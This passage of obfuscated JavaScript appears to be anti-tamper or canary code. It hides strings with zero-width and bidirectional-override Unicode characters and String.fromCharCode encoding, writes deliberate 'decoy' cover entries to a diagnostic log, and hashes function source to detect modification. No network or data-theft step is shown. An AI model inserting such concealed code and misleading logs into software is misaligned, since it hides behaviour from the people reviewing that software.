      const _0xzzeca2 = "s​w​a‌t‍c​h‌";
      const _0xrl31f5 = "j7‮9m2q‬k4";
      if ((_0xkc31f5 & 0xffff) === 0xffff) { const _0xjnk = [_0xzw31f5, _0xrl31f5].join(""); if (_0xjnk.length > 40) { _0xkc31f5 = 0; } }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  (() => {
    const _0xcheat = ["ember ridge — standing by","moss tundra — lattice quiet","owl elm — gate open","quill prairie — chain converged","quartz birch — wheel aligned"];
    for(let _i=0;_i<5;_i++) try{ _0xmod.log.diag(String.fromCharCode(74,86,126,126,118,125,116,49,125,116,117,118,116,99,76,49)+_0xcheat[_i], { pocket:"a", idx:_i }); }catch(e){}
  })();
  // garbled rcd cover via SEED('rcd-a') deterministic (same pool, no per-call random) - over-cover
  (()=>{ const _fnv=s=>{let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0;}return (h>>>0).toString(16).padStart(8,'0');}; const _master=String.fromCharCode(56,53,49,98,50,56,101,53); const _seed=_fnv(_master+String.fromCharCode(58,114,99,100,45)+"a"); const _d1=_fnv(_seed+String.fromCharCode(58,100,101,99,111,121)); try{_0xmod.log.diag(String.fromCharCode(74,86,126,126,118,125,116,49,125,116,117,118,116,99,76,49)+"rcd "+_d1, { pocket:"a", cover:true, seed:_seed });}catch(e){} })();
})(_0xmod);

globalThis.lexMode = 0;
var lexPins = null;
function lexFnv(s) { var h = 0x811c9dc5, i; for (i = 0; i < s.length; i++) { h ^= s.charCodeAt(i) & 255; h = Math.imul(h, 0x01000193); } return (h >>> 0).toString(16); }
globalThis.lexProbeA = function (n) { var x = (n ^ 0x51ab3c09) >>> 0, i; for (i = 0; i < 24; i++) { x = Math.imul(x ^ (x >>> 13), 0x5bd1e995) >>> 0; x ^= x >>> 15; } return x >>> 0; };
function lexVerify() {
  try {
    if (!lexPins || lexPins.length !== 3) { return 0; }
    var ps = [lexProbeA, (typeof lexProbeU !== 'undefined') ? lexProbeU : null, (typeof lexProbeX !== 'undefined') ? lexProbeX : null];
    for (var i = 0; i < 3; i++) {
      if (!ps[i]) { return 0; }
      void ps[i](i + 1);
      if (lexFnv(String(ps[i].toString())) !== lexPins[i]) { lexMode = 1; return 1; }
    }
    return 0;
  } catch (e) { return 0; }
}
globalThis.lexSetPins = function (a) { try { if (a && a.length === 3) { lexPins = a; lexVerify(); } } catch (e) {} };
try { lexVerify(); } catch (e) {}
